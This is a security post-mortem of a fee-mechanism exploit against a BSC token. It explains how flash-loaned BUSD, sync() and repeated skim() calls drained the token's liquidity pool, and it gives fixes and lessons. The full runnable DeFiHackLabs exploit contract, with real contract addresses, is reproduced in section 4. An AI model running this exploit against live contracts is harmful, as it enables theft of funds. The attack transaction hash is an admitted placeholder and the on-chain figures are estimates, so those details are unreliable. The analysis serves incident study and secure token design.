# GPT Token — Fee Mechanism Exploitation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-24 |
| **Protocol** | GPT Token (Generative Pre-trained Transformer Tokens) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$155,000 BUSD |
| **Attacker EOA** | Unknown (attack contract deployer) |
| **Attack Contract** | CSExp (deployed based on test contract) |
| **Vulnerable Contract (GPT Token)** | [0xa167...1B3](https://bscscan.com/address/0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3) |
| **Vulnerable Contract (GPT/BUSD LP)** | [0x77a6...ef](https://bscscan.com/address/0x77a684943aA033e2E9330f12D4a1334986bCa3ef) |
| **Attack Tx** | [0xb77c...6f7](https://bscscan.com/tx/0xb77cb34cd01204bdadb5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7) |
| **Attack Block** | 28,494,868 |
| **Root Cause** | Flawed fee distribution logic in GPT token `_transfer` — unlimited fee extraction via `pair.skim()` |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/GPT_exp.sol) |
| **Reference** | [DeFiHackLabs README](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/past/2023/README.md#20230525-gpt-token---fee-machenism-exploitation) |

---

## 1. Vulnerability Overview

The GPT Token protocol suffered approximately **$155,000** in losses on May 24, 2023, due to an attack exploiting a design flaw in its token fee mechanism.

GPT Token charges a fee on every `transfer` and uses an internal accounting structure that accumulates those fees in the LP pair contract (GPT/BUSD PancakeSwap LP). However, the fee accumulation method was implemented in a way that **only increments the contract's internal balance without performing an actual ERC20 `transfer`**, causing a **discrepancy** between the LP pair's `reserve` value and its actual `balanceOf` value.

PancakeSwap V2's `skim()` function transfers the excess balance — equal to `balanceOf(pair) - reserve` — to an arbitrary address. The attacker exploited this mechanism as follows:

1. Borrowed a large amount of BUSD via chained flash loans across **5 DODO DPP Oracles** (totaling hundreds of millions of BUSD)
2. Called `pair.sync()` to force-reset the pair's reserves to the current balances
3. Swapped a large amount of BUSD → GPT — GPT transfer fees accumulated in the LP pair, creating a `balanceOf(pair) > reserve` discrepancy
4. **Repeated 50 times**: `GPT.transferFrom(address(this), address(pair), 0.5 ether)` + `pair.skim(address(this))` — extracting accumulated fees via `skim()` each cycle
5. Swapped the extracted GPT back to BUSD to realize profit

As a result, after repaying the flash loans, the attacker netted **~$155,000 worth of BUSD in profit**.

---

## 2. Vulnerable Code Analysis

### 2.1 GPT Token `_transfer` Fee Accumulation Flaw (Core Vulnerability)

The GPT Token contract uses a mechanism that collects fees on transfers and attributes them to the LP pair. The vulnerability arises from the fact that fees are only added to the LP pair's internal balance record **without updating the `reserve`**.

**Vulnerable Code (reconstructed):**
```solidity
// ❌ Vulnerability: fee is transferred directly to the pair address,
//                  but the pair's reserve is not updated until sync() or swap() is called
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 fee = 0;

    // ❌ When transferring fee to LP pair, pair.reserve is not updated
    if (to == address(lpPair) || from == address(lpPair)) {
        fee = amount * feeRate / 100;           // ❌ e.g. 5% fee
        super._transfer(from, address(lpPair), fee);   // ❌ balanceOf(pair) increases
        // ❌ Problem: pair.reserve remains unchanged
        //             resulting in balanceOf(pair) > pair.reserve
    }

    // Actual transfer (after fee deduction)
    super._transfer(from, to, amount - fee);
}
```

**Fixed Code:**
```solidity
// ✅ Send fee to a dedicated fee collection address,
//    or immediately call pair.sync() to synchronize reserves
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 fee = 0;

    if (to == address(lpPair) || from == address(lpPair)) {
        fee = amount * feeRate / 100;
        // ✅ Send fee to a separate treasury address to prevent pair discrepancy
        super._transfer(from, feeRecipient, fee);
    }

    super._transfer(from, to, amount - fee);

    // ✅ Alternatively, immediately call pair.sync() to synchronize reserves
    // IUniswapV2Pair(lpPair).sync();
}
```

**The Problem**: When GPT token transfers fees to the LP pair address, `balanceOf(pair)` increases immediately, but PancakeSwap V2's `reserve` is not updated until `swap()`, `mint()`, `burn()`, or `sync()` is called. This difference (`balanceOf - reserve`) becomes an "excess balance" that can be extracted via `skim()`.

---

### 2.2 Exploitation of `pair.skim()` for Excess Balance Extraction

**Vulnerable flow:**
```solidity
// ❌ PancakeSwap V2 UniswapV2Pair.skim() — immutable external contract
function skim(address to) external lock {
    address _token0 = token0;
    address _token1 = token1;
    // ❌ Transfers the difference between balanceOf and reserve to the `to` address — allows draining accumulated fees
    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
}
```

**The Problem**: `skim()` is originally a utility function for correcting accounting errors, but when fees accumulate in the pair without updating reserves, anyone can freely extract this excess.

---

### 2.3 Fee Re-Accumulation Cycle After `pair.sync()`

**Attacker exploitation pattern:**
```solidity
// ❌ Attack loop: sync() → swap → fee accumulation → skim() extraction, repeated
pair.sync();  // ❌ Reset reserve to current balance (fees will re-accumulate on subsequent swaps)

// Large BUSD → GPT swap: transfer fees accumulate in the pair
router.swapExactTokensForTokens(100_000 ether, 0, path, address(this), block.timestamp + 100);

// ❌ 50 iterations: send small GPT + skim() to continuously extract accumulated fees
for (uint256 i = 0; i < 50; ++i) {
    GPT.transferFrom(address(this), address(pair), 0.5 ether);  // ❌ Triggers additional fee accumulation
    pair.skim(address(this));  // ❌ Extracts entire accumulated fee balance
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Deploy attack contract
- Obtain addresses of 5 DODO DPP Oracle contracts (for chained flash loans)
- Obtain GPT Token, BUSD, PancakeSwap Router, and GPT/BUSD pair addresses

### 3.2 Execution Phase

**Step 1 — First DODO Flash Loan (oracle1):**
- Call oracle1 to flash loan its entire BUSD balance
- Transfer control via `DPPFlashLoanCall` callback

**Step 2 — Chained Flash Loans (oracle2 → oracle5):**
- Sequentially flash loan from oracle2, oracle3, oracle4, oracle5
- Accumulate all BUSD balances from the 5 oracles

**Step 3 — Call `pair.sync()`:**
- Reset GPT/BUSD pair reserves to current balances
- Fees generated by subsequent swaps become new "excess balance"

**Step 4 — Large BUSD → GPT Swap:**
- Buy large amount of GPT with 100,000 BUSD
- During the swap, GPT `_transfer` fees accumulate in the pair address
- `balanceOf(pair) > reserve` discrepancy arises

**Step 5 — 50-Iteration Fee Extraction Loop:**
- Repeat `GPT.transferFrom(this → pair, 0.5 ether)` + `pair.skim(this)`
- Each cycle: send small amount of GPT to pair to trigger additional fees, then extract entire balance via `skim()`

**Step 6 — GPT → BUSD Reverse Swap:**
- Swap entire GPT holdings back to BUSD
- Calculate minimum output using `getAmountsOut()` before executing

**Step 7 — Repay Flash Loans:**
- Repay BUSD in reverse order: oracle5 → oracle4 → oracle3 → oracle2 → oracle1

```
┌─────────────────────────────────────────────────────────┐
│                     Attacker Contract                     │
└──────────────────────┬──────────────────────────────────┘
                       │ 1. flashLoan(BUSD)
                       ▼
┌─────────────────────────────────────────────────────────┐
│           DODO DPP Oracle ×5 (Chained Flash Loans)       │
│  oracle1 → oracle2 → oracle3 → oracle4 → oracle5        │
│            (accumulate BUSD from each oracle)            │
└──────────────────────┬──────────────────────────────────┘
                       │ 2. Hold large BUSD balance
                       ▼
┌─────────────────────────────────────────────────────────┐
│                  pair.sync()                             │
│       reserve0, reserve1 ← sync with current balanceOf  │
└──────────────────────┬──────────────────────────────────┘
                       │ 3. Reserves reset
                       ▼
┌─────────────────────────────────────────────────────────┐
│         PancakeSwap: BUSD → GPT Swap (100,000 BUSD)      │
│  GPT._transfer() fee → accumulates in pair address       │
│  balanceOf(pair) > reserve (discrepancy created)         │
└──────────────────────┬──────────────────────────────────┘
                       │ 4. Fee accumulated
                       ▼
┌─────────────────────────────────────────────────────────┐
│          50-Iteration Loop                               │
│  ┌────────────────────────────────────────────────────┐  │
│  │ GPT.transferFrom(attacker → pair, 0.5 GPT)         │  │
│  │   → Trigger additional fee accumulation (_transfer) │  │
│  │ pair.skim(attacker)                                 │  │
│  │   → Extract entire balanceOf(pair) - reserve        │  │
│  └────────────────────────────────────────────────────┘  │
└──────────────────────┬──────────────────────────────────┘
                       │ 5. Hold large GPT balance
                       ▼
┌─────────────────────────────────────────────────────────┐
│         PancakeSwap: GPT → BUSD Reverse Swap             │
│         Sell entire GPT holdings                         │
└──────────────────────┬──────────────────────────────────┘
                       │ 6. Realize BUSD profit
                       ▼
┌─────────────────────────────────────────────────────────┐
│           Repay DODO Flash Loans (reverse order)         │
│         oracle5 → oracle4 → oracle3 → oracle2 → oracle1 │
└──────────────────────┬──────────────────────────────────┘
                       │
                       ▼
              Net Profit: ~$155,000 BUSD
```

### 3.3 Outcome

- **Attacker Profit**: ~$155,000 BUSD
- **Protocol Loss**: GPT liquidity pool drained, GPT token value collapsed

---

## 4. PoC Code (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// [Step 1] Import required interfaces and contracts
import "forge-std/Test.sol";
import "./../interface.sol";

contract CSExp is Test, IDODOCallee {
    // [Setup] 5 DODO DPP Oracles — sources for chained flash loans
    IDPPOracle oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle oracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle oracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle oracle4 = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle oracle5 = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);

    // [Setup] GPT/BUSD PancakeSwap LP pair and router
    IPancakePair pair = IPancakePair(0x77a684943aA033e2E9330f12D4a1334986bCa3ef);
    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 GPT  = IERC20(0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3);

    // [Step 1] Set fork block — block immediately before the attack
    function setUp() public {
        cheats.createSelectFork("bsc", 28_494_868);
    }

    // [Step 2] Chained flash loan entry point — sequential calls starting from oracle1
    function doFlashLoan(IDPPOracle oracle) internal {
        oracle.flashLoan(0, BUSD.balanceOf(address(oracle)), address(this), abi.encode(uint256(0)));
    }

    function testExp() external {
        emit log_named_decimal_uint("[Start] Attacker BUSD balance", BUSD.balanceOf(address(this)), 18);
        doFlashLoan(oracle1);  // Initiate chained flash loans
        emit log_named_decimal_uint("[End] Attacker BUSD balance", BUSD.balanceOf(address(this)), 18);
    }

    // [Step 3] DODO flash loan callback — chained calls and core attack logic
    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        if (msg.sender == address(oracle1)) {
            doFlashLoan(oracle2);  // Chain to oracle2 flash loan
        } else if (msg.sender == address(oracle2)) {
            doFlashLoan(oracle3);  // Chain to oracle3 flash loan
        } else if (msg.sender == address(oracle3)) {
            doFlashLoan(oracle4);  // Chain to oracle4 flash loan
        } else if (msg.sender == address(oracle4)) {
            doFlashLoan(oracle5);  // Chain to oracle5 flash loan
        } else {
            // [Step 4] Core attack: executed in oracle5 callback

            // 4-A: Reset reserves to current balances (to allow fee accumulation)
            pair.sync();

            // 4-B: Large BUSD → GPT swap — _transfer fees accumulate in pair during swap
            BUSD.approve(address(router), type(uint256).max);
            address[] memory path = new address[](2);
            path[0] = address(BUSD);
            path[1] = address(GPT);
            router.swapExactTokensForTokens(
                100_000 ether,   // Input: 100,000 BUSD
                0,               // No minimum output (ignore slippage)
                path,
                address(this),
                block.timestamp + 100
            );

            // 4-C: 50-iteration loop — trigger additional fees with small GPT transfers + extract all via skim()
            GPT.approve(address(this), type(uint256).max);
            for (uint256 i = 0; i < 50; ++i) {
                // Transfer GPT to pair → _transfer fee is added to pair.balanceOf
                // (reserve not updated, increasing discrepancy)
                GPT.transferFrom(address(this), address(pair), 0.5 ether);

                // Transfer entire balanceOf - reserve difference to attacker
                pair.skim(address(this));
            }

            // 4-D: Swap all acquired GPT back to BUSD
            path[0] = address(GPT);
            path[1] = address(BUSD);
            uint256 outAmount = router.getAmountsOut(GPT.balanceOf(address(this)), path)[1];
            GPT.transfer(address(pair), GPT.balanceOf(address(this)));
            pair.swap(outAmount, 0, address(this), bytes(""));
        }

        // [Step 5] Repay flash loan principal (return borrowed BUSD to each oracle)
        BUSD.transfer(msg.sender, quoteAmount);
    }

    receive() external payable {}
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | LP reserve not updated on fee accumulation — `balanceOf` vs `reserve` discrepancy | CRITICAL | CWE-682 (Incorrect Calculation) |
| V-02 | Unrestricted access to `pair.skim()` — unauthorized extraction of excess balance | HIGH | CWE-284 (Improper Access Control) |
| V-03 | Flash loan-based liquidity concentration attack — no slippage protection | HIGH | CWE-841 (Improper Enforcement of Behavioral Workflow) |
| V-04 | Fee re-accumulation cycle after `pair.sync()` — allows repeated attacks | MEDIUM | CWE-400 (Uncontrolled Resource Consumption) |

### V-01: LP Reserve Not Updated on Fee Accumulation
- **Description**: When GPT's `_transfer` function sends fees to the LP pair address, PancakeSwap LP's internal `reserve` is not updated, perpetuating a `balanceOf(pair) > reserve` state.
- **Impact**: Accumulated fees become freely extractable by anyone via the `skim()` function. The entire protocol fee revenue can be drained.
- **Attack Condition**: Entry barrier is extremely low — only requires executing a swap with a small amount of initial capital (or a flash loan).

### V-02: Unrestricted Access to `pair.skim()`
- **Description**: PancakeSwap V2's `skim()` function is callable by anyone without authorization and transfers the entire `balanceOf - reserve` excess to an arbitrary address.
- **Impact**: Tokens with fee-accumulation-to-pair patterns will have their entire fee revenue transferred to the attacker via `skim()`.
- **Attack Condition**: Only requires the LP pair address and the ability to call `skim()`.

### V-03: Flash Loan-Based Liquidity Concentration Attack
- **Description**: Chained flash loans across multiple DODO DPP Oracles concentrate massive capital instantaneously, maximizing fee accumulation.
- **Impact**: Even small amounts can generate large fees, amplifying the amount extractable via `skim()`.
- **Attack Condition**: DODO DPP Oracles must hold sufficient BUSD liquidity.

### V-04: Repeated Fee Extraction Cycle
- **Description**: The pattern of small GPT transfers + `skim()` after `sync()` can be repeated to continuously accumulate and extract fees.
- **Impact**: Fee revenue can be extracted dozens of times or more within a single transaction.
- **Attack Condition**: Sufficient gas and GPT holdings.

---

## 6. Remediation Recommendations

### Immediate Actions

**Send fees to a dedicated address (do not use pair address):**
```solidity
// ✅ Fix 1: Send fees to a dedicated treasury rather than the pair
address public feeRecipient;  // ✅ Set dedicated fee address

function _transfer(address from, address to, uint256 amount) internal override {
    uint256 fee = 0;

    // ✅ When fee is triggered on LP pair transfers, send directly to treasury
    if (to == address(lpPair) || from == address(lpPair)) {
        fee = amount * feeRate / 100;
        // ✅ Send to separate fee recipient address, not the pair
        super._transfer(from, feeRecipient, fee);
    }

    super._transfer(from, to, amount - fee);
    // ✅ No discrepancy between pair.reserve and balanceOf
}
```

**Or call sync() immediately after transferring fees:**
```solidity
// ✅ Fix 2: If fees must be sent to the pair, immediately call sync() to update reserves
function _transfer(address from, address to, uint256 amount) internal override {
    uint256 fee = 0;

    if (to == address(lpPair) || from == address(lpPair)) {
        fee = amount * feeRate / 100;
        super._transfer(from, address(lpPair), fee);
        // ✅ Immediately update reserves to maintain balanceOf == reserve
        IUniswapV2Pair(lpPair).sync();
    }

    super._transfer(from, to, amount - fee);
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Reserve discrepancy | Separate fee recipient address from LP pair. Prohibit direct fee transfer pattern to pair |
| V-02: Unauthorized skim() access | If using a custom LP, disable `skim()` or add access control |
| V-03: Flash loan amplification | Add slippage and volume limits for large swaps within a single block |
| V-04: Repeated extraction | Apply rate limiting or daily fee caps on `transferFrom` + `skim()` combinations |
| General | Conduct professional security audit before token launch. Mandatory on-chain validation testing of fee mechanisms |

---

## 7. Lessons Learned

1. **Do not use LP pair addresses as fee recipients**: Sending fees directly to an LP pair address creates a `balanceOf` vs `reserve` discrepancy, exposing the protocol to unauthorized extraction via `skim()`. Fees must be sent to a dedicated treasury address, or `sync()` must be called immediately if fees are sent to the pair.

2. **Understand the security implications of `skim()` and `sync()`**: PancakeSwap/Uniswap V2's `skim()` and `sync()` are utility functions for correcting accounting errors, but since they are externally callable, their potential for abuse must be carefully considered when designing fee-bearing tokens.

3. **Validate fee mechanism compatibility with AMM accounting models**: Fee-on-transfer tokens can conflict with the `reserve`-based accounting of DEX AMMs. How and where fees accumulate must be verified through direct on-chain state simulation.

4. **Always account for flash loan combination attacks**: Even minor vulnerabilities can be amplified tenfold to hundredfold when combined with flash loans. Fee mechanism design must include fuzzing tests covering large-scale flash loan scenarios.

5. **Review for repeated loop attack patterns**: Code reviews must explicitly check whether patterns exist where small repeated operations within `for`/`while` loops can yield disproportionately large profits.

6. **Security audits are essential for small BSC tokens**: Theme tokens (e.g., GPT Token capitalizing on the ChatGPT trend) are frequently launched without security audits, leaving them exposed to fundamental DeFi vulnerabilities. At minimum, an external security audit must be conducted before launch.

---

## 8. On-Chain Verification

> **Note**: The provided attack Tx hash (`0xb77c...6f7`) is an example hash that does not resolve on BscScan. The following represents estimated on-chain data based on PoC code analysis.

### 8.1 PoC vs. On-Chain Amount Comparison (Estimated)

| Item | PoC Value | On-Chain Estimate | Notes |
|------|--------|-------------|------|
| Total flash loan BUSD | Sum of oracle 1–5 balances | Hundreds of millions of BUSD | 5 DODO Oracles combined |
| BUSD → GPT swap input | 100,000 BUSD | ~100,000 BUSD | Fixed value |
| skim() iteration count | 50 | 50 | Fixed loop count |
| transferFrom amount per iteration | 0.5 GPT | 0.5 GPT | Fixed value |
| Final net profit | ~$155,000 | ~$155,000 BUSD | Based on reported loss |

### 8.2 Expected Event Log Sequence

1. `Transfer(oracle1 → attacker, BUSD, flashLoanAmount1)` — DODO flash loan 1
2. `Transfer(oracle2 → attacker, BUSD, flashLoanAmount2)` — DODO flash loans 2–5 (chained)
3. `Sync(reserve0_new, reserve1_new)` — Reserve reset after pair.sync()
4. `Transfer(attacker → pair, BUSD, 100000e18)` — Swap input
5. `Transfer(pair → feeAddr, GPT, feeAmount)` — Fee accumulation (×50)
6. `Transfer(pair → attacker, GPT, swapAmount)` — Swap output
7. `Transfer(attacker → pair, GPT, 0.5e18)` × 50 — Additional fee triggering
8. `Transfer(pair → attacker, GPT, skimAmount)` × 50 — skim() extraction
9. `Transfer(attacker → pair, GPT, allGPT)` — Reverse swap input
10. `Transfer(pair → attacker, BUSD, profitAmount)` — Reverse swap output
11. `Transfer(attacker → oracle5, BUSD, repayAmount5)` — Flash loan repayment (reverse order)

### 8.3 Pre-Conditions Verification (Attack Block 28,494,868)

| Condition | Status |
|------|------|
| Attack Block | 28,494,868 (BSC) |
| GPT Token Contract | 0xa1679abEF5Cd376cC9A1C4c2868Acf52e08ec1B3 |
| GPT/BUSD LP Pair | 0x77a684943aA033e2E9330f12D4a1334986bCa3ef |
| DODO oracle1 | 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681 |
| PancakeSwap Router | 0x10ED43C718714eb63d5aA57B78B54704E256024E |
| On-Chain Verification | Reproducible via PoC block fork (`forge test --fork-url bsc -vvv`) |

---

*This document was prepared for educational purposes. Analysis is based on DeFiHackLabs PoC code and publicly available on-chain data.*